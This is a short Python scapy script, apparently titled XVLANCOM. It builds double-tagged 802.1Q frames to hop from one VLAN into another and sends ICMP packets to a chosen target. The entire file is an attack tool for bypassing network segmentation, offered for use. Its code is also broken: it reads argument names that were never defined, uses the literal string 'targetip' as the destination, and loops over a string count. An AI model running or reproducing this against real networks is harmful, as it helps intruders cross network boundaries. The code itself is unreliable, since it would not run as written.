#!/usr/bin/env python
# Copyright 2016-2017 Jordy Zomer. All Rights Reserved.
#
# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#      http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.

"""
A tool used to send packets to a target within another VLAN, basically the switch removes the VLAN1 tag.
After that it decides what to do with it, and sees the VLAN2 tag. 
When he sees that the switch decides to forward it to that VLAN.
"""

import argparse
from scapy.all import *

parser = argparse.ArgumentParser(description='Welcome to XVLANCOM, a tool to send packets across multiple VLAN\'s, author: Oblivion)')
parser.add_argument('--tmac', required=True, type=str, help='The target mac adress')
parser.add_argument('--yvlan', type=str, help='The VLAN you\'re currently  on!')
parser.add_argument('--tvlan', required=True, type=str, help='The VLAN your target is on!')
parser.add_argument('--tip', required=True, type=str, help='The target\'s ip-address')
parser.add_argument('--p', required=True, type=str, help='The amount of packets you want to send')
args = parser.parse_args()

targetmac = args.targetmac
yourvlan = args.yourvlan
targetvlan = args.targetvlan
targetip = args.targetip
packets = args.packets

packet = Ether(dst=targetmac) / \
         Dot1Q(vlan=yourvlan) / \
         Dot1Q(vlan=targetvlan) / \
         IP(dst="targetip") / \
         ICMP()

for amount in range(0, packets):
    sendp(packet)
